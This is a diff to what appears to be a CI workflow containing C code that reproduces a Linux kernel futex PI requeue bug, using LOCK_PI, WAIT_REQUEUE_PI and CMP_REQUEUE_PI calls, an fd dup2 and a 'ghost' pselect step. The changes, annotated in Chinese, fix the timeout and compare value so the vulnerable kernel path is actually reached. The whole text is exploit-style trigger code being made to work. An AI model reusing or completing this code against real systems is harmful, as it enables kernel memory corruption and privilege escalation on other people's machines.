@@ -334,6 +334,7 @@ jobs:
             }
             dup2(high_read, 319);
             FD_SET(319, &ex);
+            /* pselect 的 timeout 是相对时间（内核 poll_select_set_timeout 转绝对） */
             struct timespec ts = { .tv_sec = 5, .tv_nsec = 0 };
             printf("REPRO pselect enter shift=%d idx=%d\n", word_shift, dance_idx);
             ghost_go = 1;
@@ -348,8 +349,12 @@ jobs:
             printf("REPRO waiter LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
             __sync_synchronize(); waiter_has_chain = 1;
             while (!owner_has_target) usleep(1000);
-            struct timespec ts = { .tv_sec = 10 };
             __sync_synchronize(); waiter_waiting = 1;
+            /* futex 超时是绝对时间戳：CLOCK_MONOTONIC 当前值 + 10s
+               （旧版直接 {tv_sec=10} = 1970 年绝对时间 → 立即超时！） */
+            struct timespec ts;
+            clock_gettime(CLOCK_MONOTONIC, &ts);
+            ts.tv_sec += 10;
             r = futex(&f_wait[idx], FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target[idx], 0);
             printf("REPRO waiter WAIT_REQUEUE_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
             do_ghost_pselect();
@@ -406,7 +411,8 @@ jobs:
             long rq = -1; int edeadlk = 0;
             for (int i = 1; i <= 3; i++) {
               errno = 0;
-              rq = futex(&f_wait[idx], FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target[idx], 0);
+              /* CMP val 必须 == f_wait 当前值(0) 才能进 requeue 路径 */
+              rq = futex(&f_wait[idx], FUTEX_CMP_REQUEUE_PI, 0, (void *)1, &f_pi_target[idx], 0);
               printf("REPRO try=%d CMP_REQUEUE_PI ret=%ld errno=%d idx=%d\n", i, rq, errno, idx);
               if (errno == 35) { edeadlk = 1; break; }
               if (rq >= 1) break;
